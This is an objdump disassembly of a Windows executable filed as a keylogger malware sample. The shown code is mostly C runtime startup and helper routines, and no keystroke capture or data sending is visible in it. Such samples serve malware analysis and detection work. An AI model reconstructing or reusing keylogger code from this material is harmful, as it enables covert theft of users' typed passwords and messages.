
malware_samples/keylogger/07e0b509288c501c57cc8f11b88ac8c06e379b01b74cd910d93cfdff1f9dd7ec.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <.text>:
  401000:	c3                   	ret
  401001:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  401008:	0f 1f 84 00 00 00 00 
  40100f:	00 
  401010:	48 83 ec 28          	sub    $0x28,%rsp
  401014:	48 8b 05 15 6a 01 00 	mov    0x16a15(%rip),%rax        # 0x417a30
  40101b:	31 d2                	xor    %edx,%edx
  40101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401023:	48 8b 05 16 6a 01 00 	mov    0x16a16(%rip),%rax        # 0x417a40
  40102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401030:	48 8b 05 19 6a 01 00 	mov    0x16a19(%rip),%rax        # 0x417a50
  401037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40103d:	48 8b 05 dc 69 01 00 	mov    0x169dc(%rip),%rax        # 0x417a20
  401044:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40104a:	48 8b 05 ef 67 01 00 	mov    0x167ef(%rip),%rax        # 0x417840
  401051:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
  401056:	74 78                	je     0x4010d0
  401058:	48 8b 05 b1 69 01 00 	mov    0x169b1(%rip),%rax        # 0x417a10
  40105f:	89 15 a3 8f 01 00    	mov    %edx,0x18fa3(%rip)        # 0x41a008
  401065:	8b 00                	mov    (%rax),%eax
  401067:	85 c0                	test   %eax,%eax
  401069:	74 57                	je     0x4010c2
  40106b:	b9 02 00 00 00       	mov    $0x2,%ecx
  401070:	e8 2b a6 00 00       	call   0x40b6a0
  401075:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  40107c:	e8 9f 8f 00 00       	call   0x40a020
  401081:	48 8b 15 58 68 01 00 	mov    0x16858(%rip),%rdx        # 0x4178e0
  401088:	48 89 02             	mov    %rax,(%rdx)
  40108b:	48 8b 15 3e 68 01 00 	mov    0x1683e(%rip),%rdx        # 0x4178d0
  401092:	48 89 02             	mov    %rax,(%rdx)
  401095:	48 8b 05 a4 68 01 00 	mov    0x168a4(%rip),%rax        # 0x417940
  40109c:	8b 10                	mov    (%rax),%edx
  40109e:	48 8b 05 db 67 01 00 	mov    0x167db(%rip),%rax        # 0x417880
  4010a5:	48 8b 00             	mov    (%rax),%rax
  4010a8:	89 10                	mov    %edx,(%rax)
  4010aa:	e8 61 8b 00 00       	call   0x409c10
  4010af:	48 8b 05 3a 67 01 00 	mov    0x1673a(%rip),%rax        # 0x4177f0
  4010b6:	83 38 01             	cmpl   $0x1,(%rax)
  4010b9:	74 65                	je     0x401120
  4010bb:	31 c0                	xor    %eax,%eax
  4010bd:	48 83 c4 28          	add    $0x28,%rsp
  4010c1:	c3                   	ret
  4010c2:	b9 01 00 00 00       	mov    $0x1,%ecx
  4010c7:	e8 d4 a5 00 00       	call   0x40b6a0
  4010cc:	eb a7                	jmp    0x401075
  4010ce:	66 90                	xchg   %ax,%ax
  4010d0:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
  4010d4:	48 01 c8             	add    %rcx,%rax
  4010d7:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
  4010dd:	0f 85 75 ff ff ff    	jne    0x401058
  4010e3:	0f b7 48 18          	movzwl 0x18(%rax),%ecx
  4010e7:	66 81 f9 0b 01       	cmp    $0x10b,%cx
  4010ec:	74 45                	je     0x401133
  4010ee:	66 81 f9 0b 02       	cmp    $0x20b,%cx
  4010f3:	0f 85 5f ff ff ff    	jne    0x401058
  4010f9:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
  401100:	0f 86 52 ff ff ff    	jbe    0x401058
  401106:	8b 88 f8 00 00 00    	mov    0xf8(%rax),%ecx
  40110c:	31 d2                	xor    %edx,%edx
  40110e:	85 c9                	test   %ecx,%ecx
  401110:	0f 95 c2             	setne  %dl
  401113:	e9 40 ff ff ff       	jmp    0x401058
  401118:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40111f:	00 
  401120:	48 8d 0d e9 8d 00 00 	lea    0x8de9(%rip),%rcx        # 0x409f10
  401127:	e8 d4 8d 00 00       	call   0x409f00
  40112c:	31 c0                	xor    %eax,%eax
  40112e:	48 83 c4 28          	add    $0x28,%rsp
  401132:	c3                   	ret
  401133:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
  401137:	0f 86 1b ff ff ff    	jbe    0x401058
  40113d:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
  401144:	31 d2                	xor    %edx,%edx
  401146:	45 85 c0             	test   %r8d,%r8d
  401149:	0f 95 c2             	setne  %dl
  40114c:	e9 07 ff ff ff       	jmp    0x401058
  401151:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  401158:	0f 1f 84 00 00 00 00 
  40115f:	00 
  401160:	48 83 ec 38          	sub    $0x38,%rsp
  401164:	48 8b 05 05 68 01 00 	mov    0x16805(%rip),%rax        # 0x417970
  40116b:	4c 8d 05 9e 8e 01 00 	lea    0x18e9e(%rip),%r8        # 0x41a010
  401172:	48 8d 15 9f 8e 01 00 	lea    0x18e9f(%rip),%rdx        # 0x41a018
  401179:	48 8d 0d a0 8e 01 00 	lea    0x18ea0(%rip),%rcx        # 0x41a020
  401180:	8b 00                	mov    (%rax),%eax
  401182:	89 05 78 8e 01 00    	mov    %eax,0x18e78(%rip)        # 0x41a000
  401188:	48 8d 05 71 8e 01 00 	lea    0x18e71(%rip),%rax        # 0x41a000
  40118f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401194:	48 8b 05 95 67 01 00 	mov    0x16795(%rip),%rax        # 0x417930
  40119b:	44 8b 08             	mov    (%rax),%r9d
  40119e:	e8 15 a5 00 00       	call   0x40b6b8
  4011a3:	90                   	nop
  4011a4:	48 83 c4 38          	add    $0x38,%rsp
  4011a8:	c3                   	ret
  4011a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4011b0:	41 55                	push   %r13
  4011b2:	41 54                	push   %r12
  4011b4:	55                   	push   %rbp
  4011b5:	57                   	push   %rdi
  4011b6:	56                   	push   %rsi
  4011b7:	53                   	push   %rbx
  4011b8:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  4011bf:	31 c0                	xor    %eax,%eax
  4011c1:	b9 0d 00 00 00       	mov    $0xd,%ecx
  4011c6:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  4011cb:	48 89 d7             	mov    %rdx,%rdi
  4011ce:	f3 48 ab             	rep stos %rax,(%rdi)
  4011d1:	48 8b 3d 38 68 01 00 	mov    0x16838(%rip),%rdi        # 0x417a10
  4011d8:	44 8b 0f             	mov    (%rdi),%r9d
  4011db:	45 85 c9             	test   %r9d,%r9d
  4011de:	0f 85 ac 02 00 00    	jne    0x401490
  4011e4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
  4011eb:	00 00 
  4011ed:	48 8b 1d bc 66 01 00 	mov    0x166bc(%rip),%rbx        # 0x4178b0
  4011f4:	31 ed                	xor    %ebp,%ebp
  4011f6:	48 8b 70 08          	mov    0x8(%rax),%rsi
  4011fa:	4c 8b 25 b3 a1 03 00 	mov    0x3a1b3(%rip),%r12        # 0x43b3b4
  401201:	eb 11                	jmp    0x401214
  401203:	48 39 c6             	cmp    %rax,%rsi
  401206:	0f 84 25 02 00 00    	je     0x401431
  40120c:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  401211:	41 ff d4             	call   *%r12
  401214:	48 89 e8             	mov    %rbp,%rax
  401217:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
  40121c:	48 85 c0             	test   %rax,%rax
  40121f:	75 e2                	jne    0x401203
  401221:	48 8b 35 98 66 01 00 	mov    0x16698(%rip),%rsi        # 0x4178c0
  401228:	31 ed                	xor    %ebp,%ebp
  40122a:	8b 06                	mov    (%rsi),%eax
  40122c:	83 f8 01             	cmp    $0x1,%eax
  40122f:	0f 84 13 02 00 00    	je     0x401448
  401235:	8b 06                	mov    (%rsi),%eax
  401237:	85 c0                	test   %eax,%eax
  401239:	0f 84 61 02 00 00    	je     0x4014a0
  40123f:	c7 05 bb 8d 01 00 01 	movl   $0x1,0x18dbb(%rip)        # 0x41a004
  401246:	00 00 00 
  401249:	8b 06                	mov    (%rsi),%eax
  40124b:	83 f8 01             	cmp    $0x1,%eax
  40124e:	0f 84 09 02 00 00    	je     0x40145d
  401254:	85 ed                	test   %ebp,%ebp
  401256:	0f 84 24 02 00 00    	je     0x401480
  40125c:	48 8b 05 cd 65 01 00 	mov    0x165cd(%rip),%rax        # 0x417830
  401263:	48 8b 00             	mov    (%rax),%rax
  401266:	48 85 c0             	test   %rax,%rax
  401269:	74 0c                	je     0x401277
  40126b:	45 31 c0             	xor    %r8d,%r8d
  40126e:	ba 02 00 00 00       	mov    $0x2,%edx
  401273:	31 c9                	xor    %ecx,%ecx
  401275:	ff d0                	call   *%rax
  401277:	e8 84 8f 00 00       	call   0x40a200
  40127c:	48 8d 0d 0d 95 00 00 	lea    0x950d(%rip),%rcx        # 0x40a790
  401283:	ff 15 23 a1 03 00    	call   *0x3a123(%rip)        # 0x43b3ac
  401289:	48 8b 15 10 66 01 00 	mov    0x16610(%rip),%rdx        # 0x4178a0
  401290:	48 89 02             	mov    %rax,(%rdx)
  401293:	e8 08 94 00 00       	call   0x40a6a0
  401298:	48 8d 0d 61 fd ff ff 	lea    -0x29f(%rip),%rcx        # 0x401000
  40129f:	e8 4c a4 00 00       	call   0x40b6f0
  4012a4:	e8 57 8d 00 00       	call   0x40a000
  4012a9:	48 8b 05 90 65 01 00 	mov    0x16590(%rip),%rax        # 0x417840
  4012b0:	48 89 05 71 41 03 00 	mov    %rax,0x34171(%rip)        # 0x435428
  4012b7:	48 8b 05 b2 65 01 00 	mov    0x165b2(%rip),%rax        # 0x417870
  4012be:	48 8b 00             	mov    (%rax),%rax
  4012c1:	48 8b 00             	mov    (%rax),%rax
  4012c4:	48 85 c0             	test   %rax,%rax
  4012c7:	74 5e                	je     0x401327
  4012c9:	31 c9                	xor    %ecx,%ecx
  4012cb:	eb 15                	jmp    0x4012e2
  4012cd:	0f 1f 00             	nopl   (%rax)
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	74 2c                	je     0x401300
  4012d4:	83 e1 01             	and    $0x1,%ecx
  4012d7:	74 27                	je     0x401300
  4012d9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012de:	48 83 c0 01          	add    $0x1,%rax
  4012e2:	0f b6 10             	movzbl (%rax),%edx
  4012e5:	80 fa 20             	cmp    $0x20,%dl
  4012e8:	7e e6                	jle    0x4012d0
  4012ea:	41 89 c8             	mov    %ecx,%r8d
  4012ed:	41 83 f0 01          	xor    $0x1,%r8d
  4012f1:	80 fa 22             	cmp    $0x22,%dl
  4012f4:	41 0f 44 c8          	cmove  %r8d,%ecx
  4012f8:	eb e4                	jmp    0x4012de
  4012fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401300:	84 d2                	test   %dl,%dl
  401302:	75 11                	jne    0x401315
  401304:	eb 1a                	jmp    0x401320
  401306:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40130d:	00 00 00 
  401310:	80 fa 20             	cmp    $0x20,%dl
  401313:	7f 0b                	jg     0x401320
  401315:	48 83 c0 01          	add    $0x1,%rax
  401319:	0f b6 10             	movzbl (%rax),%edx
  40131c:	84 d2                	test   %dl,%dl
  40131e:	75 f0                	jne    0x401310
  401320:	48 89 05 f9 40 03 00 	mov    %rax,0x340f9(%rip)        # 0x435420
  401327:	44 8b 07             	mov    (%rdi),%r8d
  40132a:	45 85 c0             	test   %r8d,%r8d
  40132d:	74 19                	je     0x401348
  40132f:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
  401334:	b8 0a 00 00 00       	mov    $0xa,%eax
  401339:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
  40133f:	0f b7 c0             	movzwl %ax,%eax
  401342:	89 05 b8 cc 00 00    	mov    %eax,0xccb8(%rip)        # 0x40e000
  401348:	44 8b 25 d1 8c 01 00 	mov    0x18cd1(%rip),%r12d        # 0x41a020
  40134f:	45 8d 6c 24 01       	lea    0x1(%r12),%r13d
  401354:	4d 63 ed             	movslq %r13d,%r13
  401357:	49 c1 e5 03          	shl    $0x3,%r13
  40135b:	4c 89 e9             	mov    %r13,%rcx
  40135e:	e8 45 a2 00 00       	call   0x40b5a8
  401363:	45 85 e4             	test   %r12d,%r12d
  401366:	48 8b 3d ab 8c 01 00 	mov    0x18cab(%rip),%rdi        # 0x41a018
  40136d:	48 89 c5             	mov    %rax,%rbp
  401370:	0f 8e 48 01 00 00    	jle    0x4014be
  401376:	31 db                	xor    %ebx,%ebx
  401378:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40137f:	00 
  401380:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
  401384:	e8 f7 a1 00 00       	call   0x40b580
  401389:	48 8d 70 01          	lea    0x1(%rax),%rsi
  40138d:	48 89 f1             	mov    %rsi,%rcx
  401390:	e8 13 a2 00 00       	call   0x40b5a8
  401395:	49 89 f0             	mov    %rsi,%r8
  401398:	48 89 44 dd 00       	mov    %rax,0x0(%rbp,%rbx,8)
  40139d:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  4013a1:	48 89 c1             	mov    %rax,%rcx
  4013a4:	48 83 c3 01          	add    $0x1,%rbx
  4013a8:	e8 f3 a1 00 00       	call   0x40b5a0
  4013ad:	41 39 dc             	cmp    %ebx,%r12d
  4013b0:	7f ce                	jg     0x401380
  4013b2:	49 83 ed 08          	sub    $0x8,%r13
  4013b6:	4a c7 44 2d 00 00 00 	movq   $0x0,0x0(%rbp,%r13,1)
  4013bd:	00 00 
  4013bf:	48 89 2d 52 8c 01 00 	mov    %rbp,0x18c52(%rip)        # 0x41a018
  4013c6:	e8 15 88 00 00       	call   0x409be0
  4013cb:	48 8b 05 7e 64 01 00 	mov    0x1647e(%rip),%rax        # 0x417850
  4013d2:	48 8b 15 37 8c 01 00 	mov    0x18c37(%rip),%rdx        # 0x41a010
  4013d9:	8b 0d 41 8c 01 00    	mov    0x18c41(%rip),%ecx        # 0x41a020
  4013df:	48 8b 00             	mov    (%rax),%rax
  4013e2:	48 89 10             	mov    %rdx,(%rax)
  4013e5:	4c 8b 05 24 8c 01 00 	mov    0x18c24(%rip),%r8        # 0x41a010
  4013ec:	48 8b 15 25 8c 01 00 	mov    0x18c25(%rip),%rdx        # 0x41a018
  4013f3:	e8 98 a5 00 00       	call   0x40b990
  4013f8:	8b 0d 0a 8c 01 00    	mov    0x18c0a(%rip),%ecx        # 0x41a008
  4013fe:	89 05 08 8c 01 00    	mov    %eax,0x18c08(%rip)        # 0x41a00c
  401404:	85 c9                	test   %ecx,%ecx
  401406:	0f 84 ba 00 00 00    	je     0x4014c6
  40140c:	8b 15 f2 8b 01 00    	mov    0x18bf2(%rip),%edx        # 0x41a004
  401412:	85 d2                	test   %edx,%edx
  401414:	75 0b                	jne    0x401421
  401416:	e8 6d a2 00 00       	call   0x40b688
  40141b:	8b 05 eb 8b 01 00    	mov    0x18beb(%rip),%eax        # 0x41a00c
  401421:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  401428:	5b                   	pop    %rbx
  401429:	5e                   	pop    %rsi
  40142a:	5f                   	pop    %rdi
  40142b:	5d                   	pop    %rbp
  40142c:	41 5c                	pop    %r12
  40142e:	41 5d                	pop    %r13
  401430:	c3                   	ret
  401431:	48 8b 35 88 64 01 00 	mov    0x16488(%rip),%rsi        # 0x4178c0
  401438:	bd 01 00 00 00       	mov    $0x1,%ebp
  40143d:	8b 06                	mov    (%rsi),%eax
  40143f:	83 f8 01             	cmp    $0x1,%eax
  401442:	0f 85 ed fd ff ff    	jne    0x401235
  401448:	b9 1f 00 00 00       	mov    $0x1f,%ecx
  40144d:	e8 3e a2 00 00       	call   0x40b690
  401452:	8b 06                	mov    (%rsi),%eax
  401454:	83 f8 01             	cmp    $0x1,%eax
  401457:	0f 85 f7 fd ff ff    	jne    0x401254
  40145d:	48 8b 15 9c 64 01 00 	mov    0x1649c(%rip),%rdx        # 0x417900
  401464:	48 8b 0d 85 64 01 00 	mov    0x16485(%rip),%rcx        # 0x4178f0
  40146b:	e8 f8 a1 00 00       	call   0x40b668
  401470:	85 ed                	test   %ebp,%ebp
  401472:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
  401478:	0f 85 de fd ff ff    	jne    0x40125c
  40147e:	66 90                	xchg   %ax,%ax
  401480:	31 c0                	xor    %eax,%eax
  401482:	48 87 03             	xchg   %rax,(%rbx)
  401485:	e9 d2 fd ff ff       	jmp    0x40125c
  40148a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401490:	48 89 d1             	mov    %rdx,%rcx
  401493:	ff 15 b3 9e 03 00    	call   *0x39eb3(%rip)        # 0x43b34c
  401499:	e9 46 fd ff ff       	jmp    0x4011e4
  40149e:	66 90                	xchg   %ax,%ax
  4014a0:	48 8b 15 79 64 01 00 	mov    0x16479(%rip),%rdx        # 0x417920
  4014a7:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
  4014ad:	48 8b 0d 5c 64 01 00 	mov    0x1645c(%rip),%rcx        # 0x417910
  4014b4:	e8 af a1 00 00       	call   0x40b668
  4014b9:	e9 8b fd ff ff       	jmp    0x401249
  4014be:	45 31 ed             	xor    %r13d,%r13d
  4014c1:	e9 f0 fe ff ff       	jmp    0x4013b6
  4014c6:	89 c1                	mov    %eax,%ecx
  4014c8:	e8 3b a1 00 00       	call   0x40b608
  4014cd:	90                   	nop
  4014ce:	66 90                	xchg   %ax,%ax
  4014d0:	48 83 ec 28          	sub    $0x28,%rsp
  4014d4:	48 8b 05 35 65 01 00 	mov    0x16535(%rip),%rax        # 0x417a10
  4014db:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  4014e1:	e8 3a 87 00 00       	call   0x409c20
  4014e6:	e8 c5 fc ff ff       	call   0x4011b0
  4014eb:	90                   	nop
  4014ec:	90                   	nop
  4014ed:	48 83 c4 28          	add    $0x28,%rsp
  4014f1:	c3                   	ret
  4014f2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  4014f9:	1f 84 00 00 00 00 00 
  401500:	48 83 ec 28          	sub    $0x28,%rsp
  401504:	48 8b 05 05 65 01 00 	mov    0x16505(%rip),%rax        # 0x417a10
  40150b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  401511:	e8 0a 87 00 00       	call   0x409c20
  401516:	e8 95 fc ff ff       	call   0x4011b0
  40151b:	90                   	nop
  40151c:	90                   	nop
  40151d:	48 83 c4 28          	add    $0x28,%rsp
  401521:	c3                   	ret
  401522:	90                   	nop
  401523:	90                   	nop
  401524:	90                   	nop
  401525:	90                   	nop
  401526:	90                   	nop
  401527:	90                   	nop
  401528:	90                   	nop
  401529:	90                   	nop
  40152a:	90                   	nop
  40152b:	90                   	nop
  40152c:	90                   	nop
  40152d:	90                   	nop
  40152e:	90                   	nop
  40152f:	90                   	nop
  401530:	55                   	push   %rbp
  401531:	48 89 e5             	mov    %rsp,%rbp
  401534:	5d                   	pop    %rbp
  401535:	c3                   	ret
  401536:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40153d:	00 00 00 
  401540:	55                   	push   %rbp
  401541:	48 89 e5             	mov    %rsp,%rbp
  401544:	48 83 ec 20          	sub    $0x20,%rsp
  401548:	48 83 3d c0 cb 00 00 	cmpq   $0x0,0xcbc0(%rip)        # 0x40e110
  40154f:	00 
  401550:	74 30                	je     0x401582
  401552:	48 8d 0d a7 da 00 00 	lea    0xdaa7(%rip),%rcx        # 0x40f000
  401559:	ff 15 dd 9d 03 00    	call   *0x39ddd(%rip)        # 0x43b33c
  40155f:	48 85 c0             	test   %rax,%rax
  401562:	74 2f                	je     0x401593
  401564:	48 8d 15 a3 da 00 00 	lea    0xdaa3(%rip),%rdx        # 0x40f00e
  40156b:	48 89 c1             	mov    %rax,%rcx
  40156e:	ff 15 d0 9d 03 00    	call   *0x39dd0(%rip)        # 0x43b344
  401574:	48 85 c0             	test   %rax,%rax
  401577:	74 09                	je     0x401582
  401579:	48 8d 0d 90 cb 00 00 	lea    0xcb90(%rip),%rcx        # 0x40e110
  401580:	ff d0                	call   *%rax
  401582:	48 8d 0d 17 00 00 00 	lea    0x17(%rip),%rcx        # 0x4015a0
  401589:	48 83 c4 20          	add    $0x20,%rsp
  40158d:	5d                   	pop    %rbp
  40158e:	e9 7d 85 00 00       	jmp    0x409b10
  401593:	48 8d 05 96 ff ff ff 	lea    -0x6a(%rip),%rax        # 0x401530
  40159a:	eb dd                	jmp    0x401579
  40159c:	0f 1f 40 00          	nopl   0x0(%rax)
  4015a0:	55                   	push   %rbp
  4015a1:	48 89 e5             	mov    %rsp,%rbp
  4015a4:	5d                   	pop    %rbp
  4015a5:	c3                   	ret
  4015a6:	90                   	nop
  4015a7:	90                   	nop
  4015a8:	90                   	nop
  4015a9:	90                   	nop
  4015aa:	90                   	nop
  4015ab:	90                   	nop
  4015ac:	90                   	nop
  4015ad:	90                   	nop
  4015ae:	90                   	nop
  4015af:	90                   	nop
  4015b0:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  4015b6:	89 c8                	mov    %ecx,%eax
  4015b8:	77 10                	ja     0x4015ca
  4015ba:	31 c9                	xor    %ecx,%ecx
  4015bc:	3d 00 01 00 00       	cmp    $0x100,%eax
  4015c1:	0f 93 c1             	setae  %cl
  4015c4:	48 c1 e1 03          	shl    $0x3,%rcx
  4015c8:	eb 11                	jmp    0x4015db
  4015ca:	81 f9 00 00 00 01    	cmp    $0x1000000,%ecx
  4015d0:	48 19 c9             	sbb    %rcx,%rcx
  4015d3:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
  4015d7:	48 83 c1 18          	add    $0x18,%rcx
  4015db:	48 8d 15 5e db 00 00 	lea    0xdb5e(%rip),%rdx        # 0x40f140
  4015e2:	d3 e8                	shr    %cl,%eax
  4015e4:	48 0f be 04 02       	movsbq (%rdx,%rax,1),%rax
  4015e9:	48 01 c8             	add    %rcx,%rax
  4015ec:	c3                   	ret
  4015ed:	c3                   	ret
  4015ee:	41 54                	push   %r12
  4015f0:	55                   	push   %rbp
  4015f1:	57                   	push   %rdi
  4015f2:	56                   	push   %rsi
  4015f3:	53                   	push   %rbx
  4015f4:	48 83 ec 30          	sub    $0x30,%rsp
  4015f8:	31 f6                	xor    %esi,%esi
  4015fa:	48 89 cf             	mov    %rcx,%rdi
  4015fd:	b9 a0 0f 00 00       	mov    $0xfa0,%ecx
  401602:	e8 ac 3c 00 00       	call   0x4052b3
  401607:	4c 8d 60 10          	lea    0x10(%rax),%r12
  40160b:	48 89 c3             	mov    %rax,%rbx
  40160e:	49 89 f9             	mov    %rdi,%r9
  401611:	41 b8 a0 0f 00 00    	mov    $0xfa0,%r8d
  401617:	ba 01 00 00 00       	mov    $0x1,%edx
  40161c:	4c 89 e1             	mov    %r12,%rcx
  40161f:	e8 ac 9f 00 00       	call   0x40b5d0
  401624:	48 3d a0 0f 00 00    	cmp    $0xfa0,%rax
  40162a:	48 89 c5             	mov    %rax,%rbp
  40162d:	74 14                	je     0x401643
  40162f:	48 89 f9             	mov    %rdi,%rcx
  401632:	e8 c1 9f 00 00       	call   0x40b5f8
  401637:	85 c0                	test   %eax,%eax
  401639:	74 2a                	je     0x401665
  40163b:	48 89 f9             	mov    %rdi,%rcx
  40163e:	e8 67 a2 00 00       	call   0x40b8aa
  401643:	31 d2                	xor    %edx,%edx
  401645:	48 85 db             	test   %rbx,%rbx
  401648:	74 03                	je     0x40164d
  40164a:	48 8b 13             	mov    (%rbx),%rdx
  40164d:	48 89 f1             	mov    %rsi,%rcx
  401650:	e8 c9 3a 00 00       	call   0x40511e
  401655:	48 89 da             	mov    %rbx,%rdx
  401658:	48 89 c1             	mov    %rax,%rcx
  40165b:	48 89 c6             	mov    %rax,%rsi
  40165e:	e8 c4 49 00 00       	call   0x406027
  401663:	eb a9                	jmp    0x40160e
  401665:	48 89 d9             	mov    %rbx,%rcx
  401668:	48 89 ea             	mov    %rbp,%rdx
  40166b:	e8 59 3c 00 00       	call   0x4052c9
  401670:	48 85 c0             	test   %rax,%rax
  401673:	48 89 c3             	mov    %rax,%rbx
  401676:	74 05                	je     0x40167d
  401678:	48 8b 13             	mov    (%rbx),%rdx
  40167b:	eb 02                	jmp    0x40167f
  40167d:	31 d2                	xor    %edx,%edx
  40167f:	48 89 f1             	mov    %rsi,%rcx
  401682:	e8 97 3a 00 00       	call   0x40511e
  401687:	48 89 da             	mov    %rbx,%rdx
  40168a:	48 89 c1             	mov    %rax,%rcx
  40168d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401692:	e8 90 49 00 00       	call   0x406027
  401697:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  40169c:	48 83 c4 30          	add    $0x30,%rsp
  4016a0:	5b                   	pop    %rbx
  4016a1:	5e                   	pop    %rsi
  4016a2:	5f                   	pop    %rdi
  4016a3:	5d                   	pop    %rbp
  4016a4:	41 5c                	pop    %r12
  4016a6:	c3                   	ret
  4016a7:	48 8b 01             	mov    (%rcx),%rax
  4016aa:	48 8b 50 08          	mov    0x8(%rax),%rdx
  4016ae:	4c 8b 48 20          	mov    0x20(%rax),%r9
  4016b2:	4c 8b 42 08          	mov    0x8(%rdx),%r8
  4016b6:	4d 39 48 20          	cmp    %r9,0x20(%r8)
  4016ba:	75 17                	jne    0x4016d3
  4016bc:	48 89 11             	mov    %rdx,(%rcx)
  4016bf:	48 8b 12             	mov    (%rdx),%rdx
  4016c2:	48 89 50 08          	mov    %rdx,0x8(%rax)
  4016c6:	48 8b 11             	mov    (%rcx),%rdx
  4016c9:	48 89 02             	mov    %rax,(%rdx)
  4016cc:	48 8b 01             	mov    (%rcx),%rax
  4016cf:	48 ff 40 20          	incq   0x20(%rax)
  4016d3:	c3                   	ret
  4016d4:	48 8b 01             	mov    (%rcx),%rax
  4016d7:	48 8b 10             	mov    (%rax),%rdx
  4016da:	4c 8b 40 20          	mov    0x20(%rax),%r8
  4016de:	4c 39 42 20          	cmp    %r8,0x20(%rdx)
  4016e2:	75 11                	jne    0x4016f5
  4016e4:	48 89 11             	mov    %rdx,(%rcx)
  4016e7:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  4016eb:	48 89 10             	mov    %rdx,(%rax)
  4016ee:	48 8b 11             	mov    (%rcx),%rdx
  4016f1:	48 89 42 08          	mov    %rax,0x8(%rdx)
  4016f5:	c3                   	ret
  4016f6:	56                   	push   %rsi
  4016f7:	53                   	push   %rbx
  4016f8:	48 83 ec 38          	sub    $0x38,%rsp
  4016fc:	48 89 ce             	mov    %rcx,%rsi
  4016ff:	48 89 d3             	mov    %rdx,%rbx
  401702:	ba 10 00 00 00       	mov    $0x10,%edx
  401707:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  40170c:	e8 3b 2a 00 00       	call   0x40414c
  401711:	89 d9                	mov    %ebx,%ecx
  401713:	e8 98 fe ff ff       	call   0x4015b0
  401718:	8d 48 fb             	lea    -0x5(%rax),%ecx
  40171b:	48 83 e8 06          	sub    $0x6,%rax
  40171f:	48 d3 fb             	sar    %cl,%rbx
  401722:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401727:	48 89 f0             	mov    %rsi,%rax
  40172a:	48 83 eb 20          	sub    $0x20,%rbx
  40172e:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
  401733:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
  401738:	0f 11 06             	movups %xmm0,(%rsi)
  40173b:	48 83 c4 38          	add    $0x38,%rsp
  40173f:	5b                   	pop    %rbx
  401740:	5e                   	pop    %rsi
  401741:	c3                   	ret
  401742:	56                   	push   %rsi
  401743:	53                   	push   %rbx
  401744:	48 83 ec 38          	sub    $0x38,%rsp
  401748:	48 89 d6             	mov    %rdx,%rsi
  40174b:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  40174f:	48 89 cb             	mov    %rcx,%rbx
  401752:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401757:	e8 9a ff ff ff       	call   0x4016f6
  40175c:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
  401761:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  401766:	48 c7 46 18 00 00 00 	movq   $0x0,0x18(%rsi)
  40176d:	00 
  40176e:	48 89 c2             	mov    %rax,%rdx
  401771:	48 c1 e2 05          	shl    $0x5,%rdx
  401775:	48 01 ca             	add    %rcx,%rdx
  401778:	4c 8d 04 d3          	lea    (%rbx,%rdx,8),%r8
  40177c:	49 8b 90 78 10 00 00 	mov    0x1078(%r8),%rdx
  401783:	48 85 d2             	test   %rdx,%rdx
  401786:	48 89 56 10          	mov    %rdx,0x10(%rsi)
  40178a:	74 04                	je     0x401790
  40178c:	48 89 72 18          	mov    %rsi,0x18(%rdx)
  401790:	ba 01 00 00 00       	mov    $0x1,%edx
  401795:	49 89 b0 78 10 00 00 	mov    %rsi,0x1078(%r8)
  40179c:	83 e1 1f             	and    $0x1f,%ecx
  40179f:	48 89 d6             	mov    %rdx,%rsi
  4017a2:	48 d3 e6             	shl    %cl,%rsi
  4017a5:	89 c1                	mov    %eax,%ecx
